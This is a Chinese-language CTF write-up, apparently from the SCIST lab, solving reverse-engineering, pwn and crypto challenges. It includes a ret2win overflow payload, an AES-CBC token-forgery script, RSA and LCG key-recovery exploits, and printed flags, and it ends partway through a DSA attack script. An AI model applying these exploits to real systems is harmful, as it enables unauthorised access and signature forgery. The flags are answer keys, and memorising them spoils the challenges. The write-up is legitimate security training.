![image](https://hackmd.io/_uploads/HJ7SBMPDxx.png)

# Reverse

## Checker101

IDA打開來
![image](https://hackmd.io/_uploads/HyeFdfDDgg.png)
追進去
看到比較函式
![image](https://hackmd.io/_uploads/SJ9A_MDDeg.png)

比較的時候會將使用者輸入的字串與原FLAG比較
往上看還可以看到有一個getFlag
![image](https://hackmd.io/_uploads/rkbnozDPex.png)
但IDA反編譯不出來 所以我改用pwngdb

```
b* 0x10DDE51
```
```
 RSI  0x7fffffffd7a0 ◂— 'SCIST{Jus7_4_5imp13_F149_ch3ck3r_5h0uld_b3_4_pi3ce_0f_c4k3!}'
```

## Neko Identification System

一打開就被超長陣列貼臉
看一下上下做了甚麼 -> 浪費10min看廢話
找到主要邏輯
```javascript
b['every']((Y,d)=>(I[d]^a[d%a[R(0x19b)]])===Y)
```
直接開寫decode腳本
```
import os

def decode_image_data(a_array, b_array):
    decoded_bytes = bytearray()
    key_length = len(a_array)

    for i in range(len(b_array)):
        decoded_byte = b_array[i] ^ a_array[i % key_length]
        decoded_bytes.append(decoded_byte)

    return bytes(decoded_bytes)
a = [
    0x54, 0x61, 0x6d, 0x61, 0x6b, 0x69, 0x20, 0x4b,
    0x6f, 0x74, 0x61, 0x74, 0x73, 0x75
]
b=[就b]

decoded_data = decode_image_data(a, b)
output_filename = "decoded_image.png"

try:
    with open(output_filename, "wb") as f:
        f.write(decoded_data)

except IOError as e:
    print(f"Error: {e}")
```
![decoded_image](https://hackmd.io/_uploads/S1N8RzPPxg.png)

## Duel

main反編譯不了 直接在funtion name 找chal_
![image](https://hackmd.io/_uploads/H1j0AzPwee.png)

這啥
![image](https://hackmd.io/_uploads/r1D2kmwPll.png)

v67=>反應毫秒 buf_15=>選擇的武器
& 3 == 2 很酷的判定 感覺後面會用到
看一下chal_chooseWeapon
![image](https://hackmd.io/_uploads/Hyx6bSwwlg.png)
131072 & 3=2 got u

寫個腳本
```
from pwn import *

context.log_level = 'info'

HOST = 'lab.scist.org'
PORT = 31605

def get_flag():
    try:
        p = remote(HOST, PORT)
        log.info(f"Connected to {HOST}:{PORT}")NN

        p.recvuntil(b'> ')
        log.info("Weapon selection prompt received. Sending '7'...")
        p.sendline(b'7')
        log.success("Sent '7'.")

        p.recvuntil(b'Ready...\n')
        p.recvuntil(b'Wait for the signal...\n')
        log.info("Waiting for 'Start!' signal...")
        p.recvuntil(b'Start!\n')
        log.success("Signal 'Start!' received! Reacting NOW!")
        p.sendline(b' ')
        log.success("SPACEBAR sent!")

        output = p.recvall(timeout=5)
        decoded_output = output.decode(errors='ignore')
        log.info("Program output:\n" + decoded_output)

        if "Perfect shot!" in decoded_output:
            log.success("Perfect shot achieved!")
            flag_line_start = decoded_output.find("Flag: ")
            if flag_line_start != -1:
                flag_start_index = flag_line_start + len("Flag: ")
                flag_end_index = decoded_output.find("\n", flag_start_index)
                if flag_end_index != -1:
                    flag = decoded_output[flag_start_index:flag_end_index].strip()
                    log.success(f"🎉 Flag Found: {flag} 🎉")
                    return flag
                else:
                    log.warning("Could not find end of Flag line.")
            else:
                log.warning("No 'Flag: ' string found in the output.")
        elif "Too slow!" in decoded_output:
            log.failure("Reaction too slow! Try again.")
        elif "You didn't press the enter" in decoded_output:
            log.failure("Did not press SPACEBAR correctly. Try again.")
        elif "Bang! You're too slow, so you got shot" in decoded_output:
            log.failure("Got shot! Reaction too slow or missed signal.")
        elif "Your katana strikes" in decoded_output or "Your rapier strikes" in decoded_output:
            log.failure("Wrong weapon chosen or unexpected path. Ensure '7' is sent correctly.")
        else:
            log.warning("Unexpected output. Check the program's behavior.")

    except EOFError:
        log.error("Program terminated unexpectedly (EOF).")
    except Exception as e:
        log.error(f"An error occurred: {e}")
    finally:
        if 'p' in locals() and p.connected:
            p.close()
        log.info("Connection closed.")

if __name__ == "__main__":
    found_flag = get_flag()
    if found_flag:
        print(f"\nFinal Flag: {found_flag}")
    else:
        print("\nFailed to retrieve the flag.")
```
```
┌──(henry㉿LAPTOP-KH7U4LUG)-[/mnt/c/Users/henry/Desktop/SCIST/Rev/Duel]
└─$ python3 ./duel.py
[+] Opening connection to lab.scist.org on port 31605: Done
[*] Connected to lab.scist.org:31605
[*] Waiting for weapon selection prompt...
[*] Weapon selection prompt received. Sending '7'...
[+] Sent '7'.
[*] Waiting for 'Ready...' and 'Wait for the signal...'...
[*] 'Ready...' received.
[*] 'Wait for the signal...' received.
[*] Waiting for 'Start!' signal...
[+] Signal 'Start!' received! Reacting NOW!
[+] SPACEBAR sent!
[*] Waiting for results...
[+] Receiving all data: Done (126B)
[*] Closed connection to lab.scist.org port 31605
[*] Program output:

    Perfect shot! Your revolver fires true!
    Reaction time: 87 ms
    Flag: SCIST{H4ha_ch0051ng_4_900d_w3ap0n_15_much_m0r3_imp07ant}

[+] Perfect shot achieved!
[+] 🎉 Flag Found: SCIST{H4ha_ch0051ng_4_900d_w3ap0n_15_much_m0r3_imp07ant} 🎉
[*] Connection closed.

Final Flag: SCIST{H4ha_ch0051ng_4_900d_w3ap0n_15_much_m0r3_imp07ant}

┌──(henry㉿LAPTOP-KH7U4LUG)-[/mnt/c/Users/henry/Desktop/SCIST/Rev/Duel]
└─$
```

## not a xor checker

追到這個funtion
![image](https://hackmd.io/_uploads/B1d-YI3Pgx.png)
自訂字串?
往下看可以找到有關aes操作的加解密
![image](https://hackmd.io/_uploads/HJPVK8hvgl.png)
![image](https://hackmd.io/_uploads/S1PLtUnvxe.png)
盲猜140001890就是key
~~丟給AI寫腳本~~

```py 
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import unpad

def derive_key_from_sha256(data: bytes) -> bytes:
    hasher = SHA256.new(data)
    return hasher.digest()[:16]

def decrypt_secret():
    target_ciphertext = bytes([
        0xfb, 0xc3, 0x85, 0xa3, 0x95, 0x54, 0x32, 0xfa,
        0xab, 0x23, 0xb6, 0x5a, 0xca, 0x5a, 0x59, 0xf0,
        0xc8, 0x23, 0x3c, 0x62, 0xf7, 0x84, 0x24, 0x15,
        0x01, 0x52, 0xfc, 0x3e, 0x36, 0x44, 0x72, 0xae
    ])

    key_data = b'\xff' * 16
    iv = b'\xee' * 16
    
    key = derive_key_from_sha256(key_data)
    
    print(f"密文 (hex): {target_ciphertext.hex()}")
    print(f"AES-128 金鑰 (hex): {key.hex()}")
    print(f"IV (hex): {iv.hex()}")
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    try:
        decrypted_padded_data = cipher.decrypt(target_ciphertext)
        secret = unpad(decrypted_padded_data, AES.block_size)
        
        print("\n" + "="*40)
        print("  ✅ 解密成功!")
        print(f"  🔑 正確的祕密是: {secret.decode('utf-8')}")
        print("="*40)
        
        return secret.decode('utf-8')
        
    except ValueError as e:
        print(f"\n[!] 解密失敗: {e}")
        return None
    except Exception as e:
        print(f"\n[!] 發生未知錯誤: {e}")
        return None

if __name__ == "__main__":
    decrypt_secret()
```
    
![image](https://hackmd.io/_uploads/BJPo582wgg.png)
1/2?? 我找這AES找1小ㄟ

應該是在here is your GIFT那邊
果然在1400019d0看到類似密文的東西
![image](https://hackmd.io/_uploads/ByQ-iI3vxg.png)
感覺輸入gift就有第二段了
丟給AI看看他有什麼想法，他直接給我腳本
```py
def generate_gift():
    secret_part1 = "SCIST{AES_encry (1/2)"
    
    xor_key = bytes([
        0x23, 0x37, 0x16, 0x3a, 0x3a, 0x24, 0x02, 0x15,
        0x03, 0x6f, 0x04, 0x56, 0x00, 0x44, 0x04, 0x00,
        0x00, 0x03, 0x00, 0x00, 0x00
    ])

    print(f"輸入的祕密: {secret_part1}")
    print(f"XOR Key (hex): {xor_key.hex()}")

    secret_bytes = secret_part1.encode('utf-8')
    
    if len(secret_bytes) != len(xor_key):
        print(f"[!] 警告: 明文長度 ({len(secret_bytes)}) 與金鑰長度 ({len(xor_key)}) 不符。")
    
    min_len = min(len(secret_bytes), len(xor_key))
    
    secret_bytes = secret_bytes[:min_len]
    key_bytes = xor_key[:min_len]

    gift_bytes = bytes([s ^ k for s, k in zip(secret_bytes, key_bytes)])
        
    final_gift = gift_bytes.decode('utf-8')

    print("\n" + "="*50)
    print("  🎁 最終的 Flag 是:")
    print(f"  >>> {final_gift} <<<")
    print("="*50)

    return final_gift

if __name__ == "__main__":
    generate_gift()
```
拿到第二段flag
![image](https://hackmd.io/_uploads/rybOhI2Dee.png)


## Find The Flag

IDA打開 我逆向不好 為啥沒東西可看

![image](https://hackmd.io/_uploads/SylkCOhvxg.png)

追到這個

![image](https://hackmd.io/_uploads/B1VUCu3veg.png)

繼續追下去沒東西 回頭看一下ret的funtion

```c
__int64 sub_14000E2C0()
{
  __int64 v1; // rcx
  char v2; // [rsp+20h] [rbp-48h]
  unsigned __int8 v3; // [rsp+21h] [rbp-47h]
  unsigned int Code; // [rsp+28h] [rbp-40h]
  void (__fastcall **v5)(_QWORD, __int64, _QWORD); // [rsp+30h] [rbp-38h]
  _tls_callback_type *v6; // [rsp+38h] [rbp-30h]

  if ( !(unsigned __int8)sub_140001686(1LL) )
    sub_14000153C(7LL);
  v2 = 0;
  v3 = sub_14000156E();
  if ( dword_14005AE78 == 1 )
  {
    sub_14000153C(7LL);
  }
  else if ( dword_14005AE78 )
  {
    v2 = 1;
  }
  else
  {
    dword_14005AE78 = 1;
    if ( initterm_e((_PIFV *)&First, (_PIFV *)&Last) )
      return 255LL;
    initterm((_PVFV *)&qword_140017000, (_PVFV *)&qword_140017330);
    dword_14005AE78 = 2;
  }
  sub_14000151E(v3);
  v5 = (void (__fastcall **)(_QWORD, __int64, _QWORD))sub_140001465();
  if ( *v5 && (unsigned __int8)sub_140001244(v5) )
    (*v5)(0LL, 2LL, 0LL);
  v6 = (_tls_callback_type *)sub_1400014C4();
  if ( *v6 && (unsigned __int8)sub_140001244(v6) )
    register_thread_local_exe_atexit_callback(*v6);
  Code = sub_14000E510();
  if ( !(unsigned __int8)sub_140001442() )
    exit(Code);
  if ( !v2 )
    cexit();
  LOBYTE(v1) = 1;
  sub_140001212(v1, 0LL);
  return Code;
}
```
追一下sub_14000E510

```C
__int64 __fastcall sub_18001AB70(__int64 a1)
{
char *v1; // rdi
__int64 i; // rcx
char v4[32]; // [rsp+0h] [rbp-20h] BYREF
char v5; // [rsp+20h] [rbp+0h] BYREF
unsigned __int64 v6; // [rsp+68h] [rbp+48h]
int j; // [rsp+84h] [rbp+64h]
int v8; // [rsp+184h] [rbp+164h]
__int64 v9; // [rsp+198h] [rbp+178h]
v1 = &v5;
for ( i = 50LL; i; --i )
{
*(_DWORD *)v1 = -858993460;
v1 += 4;
}
v8 = 0;
sub_180011839(&unk_180035105);
v9 = sub_180011825(a1);
v8 |= 1u;
v6 = 31LL;
for ( j = 0; j < v6; ++j )
sub_180011460(a1, (unsigned __int8)(byte_18002E000[v6 + j] ^ byte_18002E000[j]));
sub_1800116D6(v4, &unk_180028160);
return a1;
}
```

XOR?我猜是自我解密 追下byte_18002E000

![176c64e3-4aa2-4dc8-b29c-4c61d7d3d7bc](https://hackmd.io/_uploads/BktrzK2Dgx.png)

ok先記下來 感覺等等會用到
往下追sub_180011460

```c
// attributes: thunk
__int64 __fastcall sub_180011460(__int64 a1, __int64 a2)
{
return sub_180018030(a1, a2);
}
__int64 __fastcall sub_180018030(__int64 a1, unsigned __int8 a2)
{
sub_180011839(&unk_1800350E5);
sub_1800112BC(a1, a2);
return a1;
}// attributes: thunk
__int64 __fastcall sub_180011839(__int64 a1)
{
return sub_18001DCB0(a1);
}DWORD __fastcall sub_18001DCB0(_BYTE *a1)
{
DWORD result; // eax
result = (unsigned __int8)*a1;
if ( *a1 )
{
if ( dword_18002EEEC )
return GetCurrentThreadId();
}
return result;
}// attributes: thunk
__int64 __fastcall sub_1800112BC(__int64 a1, __int64 a2)
{
return sub_18001BE00(a1, a2);
}__int64 __fastcall sub_18001BE00(__int64 a1, unsigned __int8 a2)
{
unsigned __int64 v3; // [rsp+28h] [rbp+8h]
__int64 v4; // [rsp+48h] [rbp+28h]
char v5[32]; // [rsp+124h] [rbp+104h] BYREF
char v6[44]; // [rsp+144h] [rbp+124h] BYREF
unsigned __int8 v8; // [rsp+188h] [rbp+168h] BYREF
v8 = a2;
sub_180011839((__int64)&unk_1800350E5);
v3 = *(_QWORD *)(a1 + 24);
if ( v3 >= *(_QWORD *)(a1 + 32) )
{
memset(v6, 0, 1uLL);
return sub_180011744(a1, 1LL, (unsigned __int8)v6[0], v8);
}
else
{
*(_QWORD *)(a1 + 24) = v3 + 1;
v4 = sub_180011181(a1);
sub_1800113A7(v3 + v4, &v8);
v5[0] = 0;
return sub_1800113A7(v4 + v3 + 1, v5);
}
}
```

又看了30min
ㄟ阿不對阿不就XOR?
一個一個byte key
```
key = [
    0x08, 0xCC, 0x5D, 0xE5, 0x5C, 0x63, 0x19, 0x8A, 0xB6, 0xAF, 0x5E, 0x62, 
    0x66, 0xFA, 0xCE, 0x31, 0x3F, 0xCD, 0x9E, 0x6E, 0xD8, 0x0B, 0x0B, 0xE9, 
    0x04, 0x89, 0x73, 0x00, 0x40, 0x34, 0x4A
]

encrypted_data = [
    0x5B, 0x8F, 0x14, 0xB6, 0x08, 0x18, 0x7D, 0xD5, 0xDA, 0xF0, 0x32, 0x3D, 
    0x39, 0x93, 0x91, 0x5F, 0x60, 0xA7, 0xC1, 0x0B, 0x54, 0x68, 0xB6, 0x70, 
    0xD6, 0x1A, 0x5F, 0x2F, 0x6B, 0x24, 0x6C
]
flag = ""
for i in range(31):
  decrypted_char = encrypted_data[i] ^ key[i]
  flag += chr(decrypted_char)

print(flag)
```
出來是錯的 又想10min
結果是byte key錯==
```
key = [
    0x08, 0xCC, 0x5D, 0xE5, 0x5C, 0x63, 0x19, 0x8A, 0xB6, 0xAF, 0x5E, 0x62, 
    0x66, 0xFA, 0xCE, 0x31, 0x3F, 0xCD, 0x9E, 0x6E, 0x0B, 0x0B, 0xE9, 0x04, 
    0x89, 0x73, 0x00, 0x40, 0x34, 0x4A, 0x11
]

encrypted_data = [
    0x5B, 0x8F, 0x14, 0xB6, 0x08, 0x18, 0x7D, 0xD5, 0xDA, 0xF0, 0x32, 0x3D, 
    0x39, 0x93, 0x91, 0x5F, 0x60, 0xA7, 0xC1, 0x0B, 0x54, 0x68, 0xB6, 0x70, 
    0xD6, 0x1A, 0x5F, 0x2F, 0x6B, 0x24, 0x6C
]
flag = ""
for i in range(len(key)):
  decrypted_char = encrypted_data[i] ^ key[i]
  flag += chr(decrypted_char)

print(flag)
```
flag:`SCIST{d_l_l__i_n_j_e_c_t_i_o_n}`
# Pwn
## Checkin
拖入ida

![image](https://hackmd.io/_uploads/BJ0yrKhwxg.png)

感覺就ret2win

找到ㄌ
![image](https://hackmd.io/_uploads/SJCXrYhwlx.png)

算了一下padding=40

```
from pwn import *

# Start the process
p = process('./Checkin')

# Craft the payload (adjust offset as needed)
offset = 40  # Replace with the correct offset from debugging
payload = b'A' * offset

# Receive the prompt
p.recvuntil("Ready to pwn?")

# Send the payload
p.sendline(payload)

# Switch to interactive mode
p.interactive()
```
沒拿到shell?
對齊一下
![image](https://hackmd.io/_uploads/Bk6udM6wgg.png)
跳到40195aㄅ
```
from pwn import *

# Start the process
p = process('./Checkin')

# Craft the payload (adjust offset as needed)
offset = 40  # Replace with the correct offset from debugging
target_addr = 0x40195a
payload = b'A' * offset + p64(target_addr)

# Receive the prompt
p.recvuntil("Ready to pwn?")

# Send the payload
p.sendline(payload)

# Switch to interactive mode
p.interactive()
```

# Crypto
## owo

LCG
```py
#!/bin/python3
from Crypto.Util.number import *
from secret import FLAG

OwO, OWO, owo = sorted([getPrime(512) for _ in "awa"])

Owo = bytes_to_long(FLAG)
def OWo():
    global Owo
    Owo = (OwO * Owo % owo - OWO % owo) % owo
    return Owo

for _ in range(100):
    OWo()
    
def main():
    for _ in range(10):
        oWO = bytes.fromhex(input('> '))
        oWO = bytes_to_long(oWO) ^ ((1 << 512) - 1)
        oWo = long_to_bytes((oWO % owo) ^ (OWo() % owo)).hex()
        print(f"oWo = {oWo}")
        
if __name__ == '__main__':
    main()
```
直接丟給AI
```
from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse
from math import gcd

HOST = 'lab.scist.org'
PORT = 31611

def solve():
    r = remote(HOST, PORT)

    x_values = [] 
    log.info("Collecting 10 states of the generator...")

    input_hex_for_raw_output = 'F' * (512 // 4) 

    for i in range(10):
        r.sendlineafter(b'> ', input_hex_for_raw_output.encode())
        response = r.recvline().strip().decode()
        
        try:
            x_values.append(bytes_to_long(bytes.fromhex(response.split(' = ')[1])))
        except (IndexError, ValueError) as e:
            log.error(f"Failed to parse server response '{response}'. Error: {e}")
            r.close()
            return
    
    log.success(f"Collected {len(x_values)} LCG states.")

    d_values = [x_values[i+1] - x_values[i] for i in range(len(x_values) - 1)]

    modulus_terms = []
    for i in range(len(d_values) - 2):
        term = d_values[i] * d_values[i+2] - d_values[i+1]**2
        if term != 0:
            modulus_terms.append(abs(term))
    
    if not modulus_terms:
        log.error("Not enough non-zero terms to determine the modulus (owo).")
        r.close()
        return

    owo = modulus_terms[0]
    for i in range(1, len(modulus_terms)):
        owo = gcd(owo, modulus_terms[i])
    
    log.success(f"Found owo (Modulus M): {owo} (bit length: {owo.bit_length()})")
    if not (500 <= owo.bit_length() <= 520):
        log.warning("Warning: owo bit length is not within the expected 512-bit range. Result might be incorrect.")

    suitable_d_idx = -1
    for i in range(len(d_values) - 1):
        if d_values[i] != 0 and gcd(d_values[i], owo) == 1:
            suitable_d_idx = i
            break
    
    if suitable_d_idx == -1:
        log.error("Could not find suitable d_i to determine OwO (A).")
        r.close()
        return

    OwO = (d_values[suitable_d_idx+1] * inverse(d_values[suitable_d_idx], owo)) % owo
    log.success(f"Found OwO (Multiplier A): {OwO}")

    OWO = (OwO * x_values[0] - x_values[1]) % owo
    log.success(f"Found OWO (Subtrahend B): {OWO}")

    current_flag_val = x_values[0] 
    inv_OwO = inverse(OwO, owo) 

    log.info("Reversing 101 steps to recover the original FLAG...")
    for _ in range(101): 
        current_flag_val = (inv_OwO * (current_flag_val + OWO)) % owo
    
    flag_bytes = long_to_bytes(current_flag_val)
    
    log.success(f"Decoded FLAG (long integer): {current_flag_val}")
    log.success(f"Decoded FLAG (bytes): {flag_bytes}")

    try:
        log.success(f"Decoded FLAG (text): {flag_bytes.decode('utf-8')}")
    except UnicodeDecodeError:
        log.warning("FLAG bytes could not be decoded as UTF-8. It may be binary data or contain padding.")

    r.close()

if __name__ == '__main__':
    solve()
```
![image](https://hackmd.io/_uploads/SJPaW-TDgl.png)

完美

## Yoshino's Secret Plus

```
#!/bin/python3
import os
import json
import random
from secret import FLAG
from Crypto.Util.number import *
from Crypto.Util.Padding import *
from Crypto.Cipher import AES

KEY = os.urandom(16)

def encrypt(plaintext: bytes) -> bytes:
    iv = plaintext[:16]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(plaintext[16:], AES.block_size))

def decrypt(ciphertext: bytes) -> str:
    iv = ciphertext[:16]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
    return plaintext

def parse_token(token_hex: str) -> dict:
    token_bytes = bytes.fromhex(token_hex)
    decrypted = decrypt(token_bytes)
    parts = decrypted.split(b'&')

    assert len(parts) == 4

    token_dict = {}
    for part in parts:
        key, value = part.split(b'=')
        token_dict[key.decode()] = value

    token_dict["OTP"] = int(token_dict["OTP"].decode())
    token_dict["secret"] = bytes.fromhex(token_dict["secret"].decode())
    token_dict["admin"] = int(token_dict["admin"].decode())
    return token_dict

def check(token, OTP, secret):
    token_data = parse_token(token)
    if token_data["admin"] and token_data["OTP"] == OTP and token_data["secret"] == secret:
        print(f"Here is your flag: {FLAG}")
        exit()
    else:
        print("Hi, {}".format(token_data["id"]))
        print("You don't have permission to get FLAG")

def main():
    secret = os.urandom(8)
    passkey = 'OTP={}&id={}&admin={}&secret={}'.format(12345678,"Tomotake_Yoshino_is_the_cutest<3",0,secret.hex())
    token = encrypt(os.urandom(16) + passkey.encode())
    print(f"token: {token.hex()}")
    while True:
        OTP = random.randint(0,99999999)
        print(f"OTP: {OTP}")
        token = input("token > ")
        check(token, OTP, secret)
    
if __name__ == '__main__':
    main()
```
AES加密(CBC)

deocode

```
from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse
from math import gcd

context.log_level = 'info' 

HOST = 'lab.scist.org'
PORT = 31609
p = remote(HOST, PORT)

log.info(f"Connected to {HOST}:{PORT}")

original_otp_value_str = b'12345678'
original_p0_passkey_prefix = b'OTP='
original_p0_passkey_suffix = b'&id='
original_p0_passkey_content = original_p0_passkey_prefix + original_otp_value_str + original_p0_passkey_suffix

while True:
    try:
        p.recvuntil(b"token: ")
        initial_token_hex = p.recvline().strip().decode()
        p.recvuntil(b"OTP: ")
        current_otp = int(p.recvline().strip())

        log.info(f"Initial Token: {initial_token_hex}")
        log.info(f"Current OTP: {current_otp}")

        initial_token_bytes = bytes.fromhex(initial_token_hex)
        
        modified_token_bytes_list = list(initial_token_bytes)

        current_otp_str_padded = str(current_otp).zfill(8).encode()

        target_p0_passkey_content = original_p0_passkey_prefix + current_otp_str_padded + original_p0_passkey_suffix
        
        otp_iv_mask = bytes(a ^ b for a, b in zip(original_p0_passkey_content, target_p0_passkey_content))
        
        for i in range(16):
            modified_token_bytes_list[i] = initial_token_bytes[i] ^ otp_iv_mask[i]

        admin_byte_index = 55 
        modified_token_bytes_list[admin_byte_index] = modified_token_bytes_list[admin_byte_index] ^ 0x01

        final_token_bytes = bytes(modified_token_bytes_list)
        final_token_hex = final_token_bytes.hex()

        log.info(f"Modified Token: {final_token_hex}")

        p.sendlineafter(b"token > ", final_token_hex.encode())

        response = p.recvline().strip().decode()
        log.info(f"Server Response: {response}")

        if "FLAG" in response:
            log.success("FLAG Obtained!")
            print(response)
            p.close()
            break
        elif "You don't have permission to get FLAG" in response:
            log.failure("Admin set to 1, OTP matched, but secret did not match. (This shouldn't happen with our method)")
        elif "Hi, Tomotake_Yoshino_is_the_cutest<3" in response:
            log.failure("OTP matched, but admin not 1 or parsing failed for admin.")
        elif "Bad hacker" in response:
            log.warning("Parsing failed.")
        elif "Error QQ" in response:
            log.error("Decryption Error.")
        else:
            log.warning("Unexpected response. Retrying...")

    except EOFError:
        log.error("Server closed connection. Exiting.")
        p.close()
        break
    except Exception as e:
        log.error(f"An error occurred: {e}. Retrying...")
        try:
            p.close()
            p = remote(HOST, PORT)
            log.info(f"Reconnected to {HOST}:{PORT}")
        except Exception as reconnect_e:
            log.critical(f"Failed to reconnect: {reconnect_e}. Exiting.")
            break
```
![image](https://hackmd.io/_uploads/BkQwEWTDle.png)

## RSA SigSig

```
#!/bin/python3
from Crypto.Util.number import *
from random import getrandbits
from secret import FLAG

p, q = getPrime(512), getPrime(512)
n = p * q

def sign(skey, pkey, message):
    message = bytes_to_long(message)
    half = skey.bit_length() // 2
    left_part = skey >> half
    right_part = skey & ((1 << half) - 1)
    exponent = left_part * right_part
    return pow(message ^ pkey, exponent, n)

def verify(pkey, signature, message):
    message = bytes_to_long(message)
    return pow(signature, pkey, n) ^ pkey == message

def gen_keypair():
    while True:
        try:
            skey = getrandbits(1024)
            half = skey.bit_length() // 2
            left_part = skey >> half
            right_part = skey & ((1 << half) - 1)
            exponent = left_part * right_part
            pkey = pow(exponent, -1, (p - 1) * (q - 1))
            break
        except:
            pass
    return (skey, pkey)

def get_example():
    (skey, pkey) = gen_keypair()
    signature = sign(skey, pkey, b'example_msg')
    assert verify(pkey, signature, b'example_msg')
    print(f"{pkey = }")
    print(f"{skey = }")
    print(f"{n = }")

def get_flag():
    pkey = getrandbits(64)
    print(f"{pkey = }")
    signature = int(input("signature : "))
    if verify(pkey, signature, b'give_me_flag'):
        print(f"[+] success")
        print(f"here is your FLAG: {FLAG}")
        exit(0)
    else:
        print(f"[+] failed")

def main():
    get_example()
    for _ in range(100):
        get_flag()
  

if __name__ == '__main__':
    main()
```

偽造簽名

```

from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse
from math import gcd
import random

context.log_level = 'info' 

HOST = 'lab.scist.org'
PORT = 31613

def factor_n_with_ed(N, e_ex, d_ex):
    k = e_ex * d_ex - 1
    
    r = k
    t = 0
    while r % 2 == 0:
        r //= 2
        t += 1
    
    log.info(f"Factoring N: K = {k}, r = {r}, t = {t}")

    while True:
        a = random.randint(2, N - 2)
        
        x = pow(a, r, N)
        
        if x == 1 or x == N - 1:
            continue

        for _ in range(t - 1):
            prev_x = x
            x = pow(x, 2, N)
            
            if x == 1:
                p_candidate = gcd(prev_x - 1, N)
                if p_candidate != 1 and p_candidate != N:
                    q_candidate = N // p_candidate
                    log.success(f"Found factors: p = {p_candidate}, q = {q_candidate}")
                    return p_candidate, q_candidate
                break
            
            if x == N - 1:
                break
        
def solve():
    r = remote(HOST, PORT)

    log.info("Receiving example data to factor N...")
    
    r.recvuntil(b"pkey = ")
    pkey_ex = int(r.recvline().strip())
    
    r.recvuntil(b"skey = ")
    skey_ex = int(r.recvline().strip())
    
    r.recvuntil(b"n = ")
    n = int(r.recvline().strip())

    log.info(f"Received from example: pkey_ex={pkey_ex}, skey_ex={skey_ex}, n={n}")
    
    half_skey = skey_ex.bit_length() // 2
    left_part = skey_ex >> half_skey
    right_part = skey_ex & ((1 << half_skey) - 1)
    d_ex = left_part * right_part
    log.info(f"Calculated d_ex from skey_ex: {d_ex}")

    p, q = factor_n_with_ed(n, pkey_ex, d_ex)
    
    if p is None or q is None:
        log.error("Failed to factor N. Exiting.")
        r.close()
        return

    phi_n = (p - 1) * (q - 1)
    log.success(f"Calculated phi(n): {phi_n}")

    message_to_sign_bytes = b'give_me_flag'
    message_to_sign_long = bytes_to_long(message_to_sign_bytes)
    
    for i in range(100):
        log.info(f"Solving round {i+1}/100...")
        try:
            r.recvuntil(b"pkey = ")
            pkey_flag = int(r.recvline().strip())
            log.info(f"Current pkey_flag (e): {pkey_flag}")

            if gcd(pkey_flag, phi_n) != 1:
                log.warning(f"pkey_flag {pkey_flag} not coprime to phi(n) {phi_n}. Skipping this round.")
                r.sendline(b'0')
                continue

            d_flag = inverse(pkey_flag, phi_n)
            log.info(f"Calculated d_flag: {d_flag}")

            target_val = message_to_sign_long ^ pkey_flag
            
            signature = pow(target_val, d_flag, n)
            log.info(f"Forged signature: {signature}")

            r.sendline(str(signature).encode())
            
            response = r.recvline().strip().decode()
            log.info(f"Server response: {response}")

            if "[+] success" in response:
                log.success(f"Signature accepted for round {i+1}!")
                flag_response = r.recvline().strip().decode()
                log.success(f"FLAG: {flag_response}")
                r.close()
                return
            else:
                log.failure(f"Signature failed for round {i+1}.")

        except EOFError:
            log.error("Server closed connection prematurely. Exiting.")
            r.close()
            break
        except Exception as e:
            log.error(f"An error occurred in round {i+1}: {e}. Trying next round.")
            r.sendline(b'0')

    log.info("Completed all 100 rounds without getting the FLAG. Something might be wrong.")
    r.close()

if __name__ == '__main__':
    solve()
```

![image](https://hackmd.io/_uploads/Syo1Obavge.png)


## dsaaaaaaaaaaaaaaaaa

```
#!/bin/python3
from hashlib import sha1
from Crypto.Util.number import *
from secret import FLAG
from random import randint, getrandbits

def gen_params():
    while True:
        q = getPrime(160)
        if q % 6 == 1:
            break

    while True:
        p = q * getrandbits(864) + 1
        if isPrime(p):
            break
    
    while True:
        R = [pow(randint(1, q - 1), (q - 1) // (3 - int(_)), q) for _ in "01"]
        a, b = R[0], R[1]
        if a != 1 and b != 1:
            break
    
    g = pow(2, (p - 1) // q, p)
    x = randint(1, q - 1)
    y = pow(g, x, p)
    k = randint(1, q - 1)
    return p, q, g, x, y, k, a, b

p, q, g, x, y, k, a, b = gen_params()

def H(m):
    return bytes_to_long(sha1(m).digest())

def sign(m, k, t):
    k = ((k ^ pow(a, t, q)) * pow(b, t, q) )% q
    r = pow(g, k, p) % q
    s = (pow(k, -1, q) * (H(m) + x * r)) % q
    return (r, s)

def verify(m, r, s):
    if not (0 < r < q and 0 < s < q):
        return False
    w = pow(s, -1, q)
    u1 = H(m) * w % q
    u2 = r * w % q
    v = (pow(g, u1, p) * pow(y, u2, p) % p) % q
    return v == r

def example(t):
    menu = '''[A]yachiNene  
[I]nabaMeguru  
[T]ogakushiTouko  
[S]hiibaTsumugi  
> '''

    choice = input(menu).lower()

    if choice == 'a':
        msg = b'AyachiNene'
    elif choice == 'i':
        msg = b'InabaMeguru'
    elif choice == 't':
        msg = b'TogakushiTouko'
    elif choice == 's':
        msg = b'ShiibaTsumugi'
    else:
        print("Invalid choice.")
        exit(0)
    
    
    r, s = sign(msg, k, t)
    assert verify(msg, r, s)
    return r, s

def main():
    menu = '''[E]xample
[G]et FLAG
> '''
    print(f"{p = }")
    print(f"{q = }")
    print(f"{g = }")
    print(f"{y = }")
    
    for i in range(10):
        choice = input(menu).lower()
        if choice == 'e':
            r, s = example(i)
            print(f"{r = }")
            print(f"{s = }")
        if choice == 'g':
            r = int(input("r: "))
            s = int(input("s: "))
            if verify(b'GET_FLAG', r, s):
                print(f"Here's your flag: {FLAG}")
                exit(0)
            else:
                print("Invalid signature.")
                exit(0)

if __name__ == '__main__':
    main()
```

DSA 的私鑰恢復與簽章偽造

```py
from pwn import *
from hashlib import sha1
from Crypto.Util.number import bytes_to_long

def H(m):
    return bytes_to_long(sha1(m).digest())

def solve():
    io = remote("lab.scist.org", 31612)
    
    context.log_level = 'debug'

    log.info("Starting connection and parameter retrieval...")

    io.recvuntil(b"p = ")
    p = int(io.recvline().strip())
    io.recvuntil(b"q = ")
    q = int(io.recvline().strip())
    io.recvuntil(b"g = ")
